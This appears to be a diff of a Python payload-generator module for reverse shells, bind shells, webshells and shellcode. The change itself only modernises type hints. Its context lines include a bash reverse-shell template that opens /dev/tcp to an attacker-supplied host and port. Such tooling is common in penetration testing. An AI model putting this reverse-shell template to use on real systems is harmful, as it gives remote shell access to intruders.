@@ -5,9 +5,8 @@ Generates shellcode, reverse shells, webshells, and bind shells
 in multiple languages with optional encoding/obfuscation.
 """
 
-from dataclasses import dataclass, field
+from dataclasses import dataclass
 from enum import Enum
-from typing import Dict, List, Optional
 
 
 class PayloadLanguage(Enum):
@@ -39,7 +38,7 @@ class GeneratedPayload:
     lport: int = 0
     rport: int = 0
 
-    def to_dict(self) -> Dict:
+    def to_dict(self) -> dict:
         return {
             "type": self.payload_type.value,
             "language": self.language.value,
@@ -51,7 +50,7 @@ class GeneratedPayload:
         }
 
 
-SHELL_TEMPLATES: Dict[str, Dict[str, str]] = {
+SHELL_TEMPLATES: dict[str, dict[str, str]] = {
     "reverse_shell": {
         "bash": 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1',
         "python": (
@@ -218,8 +217,8 @@ class PayloadGenerator:
             rport=rport,
         )
 
-    def generate_chain(self, lhost: str = "127.0.0.1", lport: int = 4444) -> List[GeneratedPayload]:
-        payloads: List[GeneratedPayload] = []
+    def generate_chain(self, lhost: str = "127.0.0.1", lport: int = 4444) -> list[GeneratedPayload]:
+        payloads: list[GeneratedPayload] = []
 
         for lang in PayloadLanguage:
             if lang == PayloadLanguage.ASPX:
@@ -232,8 +231,8 @@ class PayloadGenerator:
 
         return payloads
 
-    def list_available(self) -> Dict[str, List[str]]:
-        result: Dict[str, List[str]] = {}
+    def list_available(self) -> dict[str, list[str]]:
+        result: dict[str, list[str]] = {}
         for ptype in PayloadType:
             key = ptype.value
             templates = SHELL_TEMPLATES.get(key, {})
